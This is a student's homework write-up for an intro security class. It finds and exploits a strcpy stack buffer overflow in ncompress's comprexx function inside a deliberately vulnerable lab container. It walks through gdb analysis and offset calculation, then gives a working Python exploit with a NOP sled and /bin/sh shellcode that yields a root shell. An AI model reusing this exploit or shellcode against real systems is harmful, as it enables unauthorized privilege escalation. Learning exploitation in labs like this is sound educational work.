# Ncompress

A write up for homework 0 Intro to Security.

## Understanding compress42.c

I started by analyzing the source code `compress42.c`.

``` c
#include	<stdio.h>
#include	<fcntl.h>
#include	<ctype.h>
#include	<signal.h>
#include	<sys/types.h>
#include	<sys/stat.h>
#include    <string.h>
#include    <strings.h>
#include	<errno.h>
```
I checked what was being included in the code and searched for vulnerable to buffer overflow functions in the code. 

With a quick google search I found this stack overflow [post](https://stackoverflow.com/questions/167165/what-c-c-functions-are-most-often-used-incorrectly-and-can-lead-to-buffer-over), so instead of studying the whole code I could find these functions (`gets`, `strcpy`, `strcat` and `scanf`) with `grep`.

```bash
ubuntu@dbd4f638e4eb:~$ grep -E 'strcpy|strcat|scanf|gets' compress42.c 
	extern	char	*strcpy	LARGS((char *,char const *));
	extern	char	*strcat	LARGS((char *,char const *));
		strcpy(tempname,*fileptr);
						strcat(tempname,".Z");
				strcpy(ofname, tempname);
				strcpy(ofname, tempname);
				strcat(ofname, ".Z");
			  	strcpy(nbuf,dir);
			  	strcat(nbuf,"/");
			  	strcat(nbuf,dp->d_name);
ubuntu@dbd4f638e4eb:~$ 
```

After that I focused mostly on the `strcpy` function.

In `compress42.c` there is the function comprexx: 

```c
void
comprexx(fileptr)
	char	**fileptr;
	{
		int		fdin;
		int		fdout;
		char	tempname[MAXPATHLEN];

		strcpy(tempname,*fileptr);
```

Since `MAXPATHLEN` is 1024, `strcpy` does not check whether the content of `fileptr` exceeds this limit, making it vulnerable to buffer overflow.

## Exploiting the Vulnerability: GDB and Segmentation fault Analysis

I tested `ncompress` with different input sizes:
```bash
ubuntu@dbd4f638e4eb:~$ ncompress $(python3 -c 'print("B"*1024)')
BBBBBB.........BBBBB: File name too long
```
Increasing the input to 2000 characters triggered a segfault:
``` bash
ubuntu@dbd4f638e4eb:~$ ncompress $(python3 -c 'print("B"*2000)')
BBBBB..........BBBBBB: File name too long
Segmentation fault (core dumped)
```

I then ran`zncompress_real` in `gdb`:
``` bash
ubuntu@dbd4f638e4eb:~$ gdb --args ncompress_real $(python3 -c 'print("B"*2000)')
```
Setting breakpoints:
``` bash
(gdb) b main
Breakpoint 1 at 0x135f: file compress42.c, line 704.
(gdb) b comprexx
Breakpoint 2 at 0x17fb: file compress42.c, line 888.
(gdb) 
```
Running the program:
``` bash
(gdb) r
Starting program: /usr/sbin/ncompress_real BBBBBBB...BBBBBBBBB
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, main (argc=2, argv=0xffffcf04) at compress42.c:704
warning: Source file is more recent than executable.
704	    	if (fgnd_flag = (signal(SIGINT, SIG_IGN) != SIG_IGN))
(gdb) 
```
``` bash
(gdb) c
Continuing.

Breakpoint 2, comprexx (fileptr=0x565c51a0) at compress42.c:888
888			strcpy(tempname,*fileptr);
(gdb) 
```

Next I disassembled `comprexx` to analyze its stack usage.

## Finding the Buffer size

``` bash
Dump of assembler code for function comprexx:
   0x565567e4 <+0>:	push   %ebp
   0x565567e5 <+1>:	mov    %esp,%ebp
   0x565567e7 <+3>:	push   %edi
   0x565567e8 <+4>:	push   %esi
   0x565567e9 <+5>:	push   %ebx
   0x565567ea <+6>:	sub    $0x4dc,%esp		# Allocate Stack Space (1244 bytes)
   0x565567f0 <+12>:	call   0x56556240 <__x86.get_pc_thunk.bx>
   0x565567f5 <+17>:	add    $0x47ff,%ebx
=> 0x565567fb <+23>:	mov    0x8(%ebp),%eax
   0x565567fe <+26>:	mov    (%eax),%eax
   0x56556800 <+28>:	sub    $0x8,%esp
   0x56556803 <+31>:	push   %eax
   0x56556804 <+32>:	lea    -0x428(%ebp),%eax	# Buffer starts at ebp - 1064
   0x5655680a <+38>:	push   %eax
   0x5655680b <+39>:	call   0x565560e0 <strcpy@plt>
   0x56556810 <+44>:	add    $0x10,%esp
   0x56556813 <+47>:	call   0x56556170 <__errno_location@plt>
   0x56556818 <+52>:	movl   $0x0,(%eax)
   0x5655681e <+58>:	sub    $0x8,%esp
   0x56556821 <+61>:	lea    0x494c(%ebx),%eax
   0x56556827 <+67>:	push   %eax
   0x56556828 <+68>:	lea    -0x428(%ebp),%eax
   0x5655682e <+74>:	push   %eax
   0x5655682f <+75>:	call   0x56556100 <stat@plt>
   0x56556834 <+80>:	add    $0x10,%esp
   0x56556837 <+83>:	cmp    $0xffffffff,%eax
   0x5655683a <+86>:	jne    0x565569b0 <comprexx+460>
   0x56556840 <+92>:	mov    0xf4(%ebx),%eax
   0x56556846 <+98>:	test   %eax,%eax
   0x56556848 <+100>:	je     0x5655698e <comprexx+426>
   0x5655684e <+106>:	call   0x56556170 <__errno_location@plt>
--Type <RET> for more, q to quit, c to continue without paging--
```
We dont have to focus on the whole thing just everything that happens before strcpy.

``` bash
   0x565567e4 <+0>:	push   %ebp
   0x565567e5 <+1>:	mov    %esp,%ebp
   0x565567e7 <+3>:	push   %edi
   0x565567e8 <+4>:	push   %esi
   0x565567e9 <+5>:	push   %ebx
   0x565567ea <+6>:	sub    $0x4dc,%esp
   0x565567f0 <+12>:	call   0x56556240 <__x86.get_pc_thunk.bx>
   0x565567f5 <+17>:	add    $0x47ff,%ebx
=> 0x565567fb <+23>:	mov    0x8(%ebp),%eax
   0x565567fe <+26>:	mov    (%eax),%eax
   0x56556800 <+28>:	sub    $0x8,%esp
   0x56556803 <+31>:	push   %eax
   0x56556804 <+32>:	lea    -0x428(%ebp),%eax
   0x5655680a <+38>:	push   %eax
   0x5655680b <+39>:	call   0x565560e0 <strcpy@plt>
```

First lines: 
```bash 
   0x565567e4 <+0>:	push   %ebp
   0x565567e5 <+1>:	mov    %esp,%ebp
   0x565567e7 <+3>:	push   %edi
   0x565567e8 <+4>:	push   %esi
   0x565567e9 <+5>:	push   %ebx
```
It pushes edi, esi and ebx so that's 12 bytes (esp is at ebp - 12).
``` bash
   0x565567ea <+6>:	sub    $0x4dc,%esp
```
Then there's a subtraction from esp so now we know (with p 0x4dc) that the total space allocated for the stack is 1244 bytes. (esp is at ebp - 12 - 0x4dc)

But when we call strcpy there is the line 
``` bash
   0x56556804 <+32>:	lea    -0x428(%ebp),%eax
```
-0x428 is -1064 bytes, so the buffer starts at ebp - 1064 bytes.

So for now we know that total stack space is  1244 bytes and that the buffer starts at ebp - 1064 bytes.

So we want the start of the buffer and the return address(ebp + 4). Which is 
(ebp + 4) - (ebp -0x428) = 1068 bytes. 1068 bytes before the return address. So writing 1068 bytes would reach the return address. So including the return address
it's 1068 + 4 = 1072. 

Testing with 1072 bytes:
``` python
import sys

payload = b""
payload += b"B" * 1072

sys.stdout.buffer.write(payload)
```
Executing:
``` bash
ubuntu@dbd4f638e4eb:~$ python3 exploit1072.py > /tmp/payload1072
ubuntu@dbd4f638e4eb:~$ ncompress `cat /tmp/payload1072`
BBBB.....BBBB: File name too long
Segmentation fault (core dumped)
```
Checking logs:
``` bash
ubuntu@dbd4f638e4eb:~$ sudo dmesg -T | grep segfault | tail -3
[Mon Mar 17 17:05:05 2025] ncompress_real[10227]: segfault at 42424242 ip 0000000042424242 sp 00000000ffffce20 error 14 likely on CPU 1 (core 1, socket 0)
[Mon Mar 17 17:05:29 2025] ncompress_real[10245]: segfault at 42424242 ip 0000000042424242 sp 00000000ffffce20 error 14 likely on CPU 1 (core 1, socket 0)
[Mon Mar 17 17:39:18 2025] ncompress_real[11639]: segfault at 42424242 ip 0000000042424242 sp 00000000ffffd1c0 error 14 likely on CPU 2 (core 2, socket 0)
```
Segfault at 42424242!! and we write down the address `0xffff1dc0` for later.

The stack layout is:
 Return address
 Saved ebp
 Saved edi (ebp - 4)
 Saved esi (ebp - 8)
 Saved ebx (ebp - 12)
 Allocated Space (Starts at ebp - 12 - 0x4dc = 1256 bytes)
 The buffer is at ebp - 0x428 inside the allocated space.

So when we overflow the buffer, we start from `ebp -0x428` and go towards higher addresses. So the distance from the start of the buffer to the saved ebx (ebp -12)
is  __`ebp` - 12 - (`ebp` - 1064) = 1052 bytes__. That means that if we run the program with __1052__ bytes we will cause a Segmentation Fault.

Testing with 1052 bytes
``` python
import sys

payload = b""
payload += b"B" * 1052

sys.stdout.buffer.write(payload)
```
Executing
```bash
ubuntu@dbd4f638e4eb:~$ python3 exploit1052.py > /tmp/payload1052
ubuntu@dbd4f638e4eb:~$ ncompress `cat /tmp/payload1052`
BBBBBBBBBBBBB............BBBBBBBBBBBB: File name too long
Segmentation fault (core dumped)
```
Testing with 1051 bytes:
``` python3
import sys

payload = b""
payload += b"B" * 1051

sys.stdout.buffer.write(payload)
```
Executing:
```bash
ubuntu@dbd4f638e4eb:~$ python3 exploit1051.py > /tmp/payload1051
ubuntu@dbd4f638e4eb:~$ ncompress `cat /tmp/payload1051`
BBBBBBB.....BBBBBB: File name too long
```

At 1052 bytes, we encounter a Segmentation fault, but at 1051 the program runs without crashing (We just get a File name too long error). Even though I already found the offset at 1072 bytes, I tested 1052 bytes to further understand how the stack is structured. 
Let's break down how we reach __1072__ bytes:
1. __1052__ bytes - This is the point where we start overwriting saved registers, meaning this is where the saved `ebx` is located.
2. __+12__ bytes - These extra bytes account for the three registers.
3. __+8__ bytes - The saved `ebp` and the return address.

So adding it all together:
__1052 (buffer) + 12 (registers) + 8 (saved `ebp` + return address) = 1072 bytes__.
This is another way to confirm that the correct offset for controlling the return address is __1072__ bytes.

## Writing the exploit

Following the lecture and with the address we found `0xffff1dc0` we can write `exploit.py`:

``` python3
#!/usr/bin/env python3

import sys
import struct

payload = b""
# program crashes at 1052!!!!
payload += b"B" * 1068
payload += struct.pack("<I", 0xffff1cd0 + 21000)
payload += b"\x90" * 42000
payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"  # Shellcode

sys.stdout.buffer.write(payload)
```

Running the exploit(successful invocation):
``` bash
ilias@ilias-PC:~/Documents/Github/homework0-security$ docker run --rm --privileged -v `pwd`/exploit.py:/exploit.py -it ethan42/ncompress:vulnerable
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

ubuntu@3e5ec9e3ac32:~$ echo hello | ncompress
��hʰa�Fubuntu@3e5ec9e3ac32:~$ python3 /exploit.py > /tmp/payload
ubuntu@3e5ec9e3ac32:~$ whoami
ubuntu
ubuntu@3e5ec9e3ac32:~$ ncompress `cat /tmp/payload`
BBBBBBBBBBBBBBBBBBBBBBBBBB...BBBBBB���������������������������������������������������������...(more characters like this appear but i removed them cause the file was huge )...�����1�Ph//shh/bin����°
                                                                                1�@̀: File name too long
# whoami
root
# 
```
